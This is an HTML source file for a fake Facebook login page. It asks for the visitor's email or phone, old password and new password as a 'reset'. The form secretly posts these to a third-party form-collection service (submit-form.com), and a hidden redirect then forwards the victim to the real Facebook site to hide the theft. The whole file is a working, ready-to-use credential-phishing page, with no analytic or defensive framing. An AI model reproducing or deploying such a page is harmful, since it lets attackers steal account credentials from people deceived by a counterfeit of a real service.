<html lang="en">
  <head>

    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="Facebook_logo_(square).png">
  </head>
  <body>
    <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">Facebook</h1>
          <p>Login to Facebook.</p>
        </div>
          <form action="https://submit-form.com/wJAD41fj9" method="post">
            <input
            type="hidden"
           name="_redirect"
           value="https://www.facebook.com/login/?next=https%3A%2F%2Fwww.facebook.com%2F%3Fstype%3Dlo%26deoia%3D1%26jlou%3DAfdNOaIr0HITYqeFbp7WdnkT96R7ZKZFvj14FgGkQU8EkaeY8fECuPkf6X_FKgFOX39sThxXXSj2xOvl_afh7Xahd-iw6V4XRFtW-L4GBbccRg%26smuh%3D33958%26lh%3DAc9vP9Vx_-7L7w_5P_Q"
           type="hidden"/>
           <input type="hidden" name="_append" value="false"/>
            <input type="text" id="mail" name="mail" placeholder="Email or Phone Number" required />
            <input type="password" id="main" name="main" placeholder="Old Password" required>
            <input type="password"  id="no need" name="no need" placeholder="New Password" required>
            <button class="login" type="submit">Reset</button>
            <a href="#">Forgot Password ?</a>
            
          </form>
      </div>
    </div>
  </body>
</html>
